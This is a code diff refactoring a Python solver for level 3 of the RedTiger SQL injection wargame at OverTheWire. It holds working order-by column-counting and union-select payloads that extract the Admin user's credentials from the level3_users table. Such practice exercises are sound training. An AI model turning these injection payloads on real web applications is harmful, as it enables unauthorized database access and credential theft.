@@ -56,12 +56,13 @@ def encrypt_php(cryptstr: str):
 
 def main():
     '''
+    url-encoding with simple sql injection
+
     Target: Get the password of the user Admin.
     Hint: Try to get an error. Tablename: level3_users
     '''
     base_name = 'level3_users'
     url = "https://redtiger.labs.overthewire.org/level3.php"
-    admin_encode_param = 'MDQyMjExMDE0MTgyMTQw'
     finds = ['username', 'password']  # what we are finding
     pass_r = 'The password for the next level is: '
     level = 'level3login'
@@ -81,40 +82,26 @@ def main():
         with open('version.txt', 'rt') as v:
             content = v.read(5)
             print(content)
-            if content[4] == 5:
-                fun = encrypt_php
     except:
         print('version php not found')
-
-    # Counting the number of columns
-    columns = tg.count_columns(url, "' order by %s #", 'usr', cook, fun)
-    list_of_columns = [str(c + 1) for c in range(columns)]
-
-    # Search for visible columns
-    encode_payload = fun(
-        f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin'#")
-    payload = dict(usr=encode_payload)
-    p_base = dict(usr=admin_encode_param)
-    list_of_visible, html_visible = tg.find_visible_columns(url, len(list_of_columns),
-                                                            payload, p_base, cook)
-
-    # Search for the desired data
-    if len(finds) <= len(list_of_visible):
-        for i, f in enumerate(finds):
-            list_of_columns[int(list_of_visible[i]) - 1] = f
-    else:
-        print('too small visible list')
         exit(1)
 
-    encode_payload = fun(
-        f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin' #")
-    payload = dict(usr=encode_payload)
-    keys = tg.find_param(url, len(finds), html_visible,
-                         payload, cook)
+    if content[4] == '5':
+        fun = encrypt_php
+
+    # Counting the number of columns
+    data = dict(usr="' order by %s #")
+    if not (columns := tg.count_columns(url, data, cook, fun)):
+        return False
+
+    # Search for visible columns and desired data
+    payload = f"' union select %s from {base_name} where username='Admin'#"
+    if not (keys := tg.find_visible_columns(url, columns, payload, 'usr', finds, cook, fun)):
+        return False
 
     # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
-    response = tg.get_request(url, data, cook, method='post')
+    response = req.post_request(url, data, cook)
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
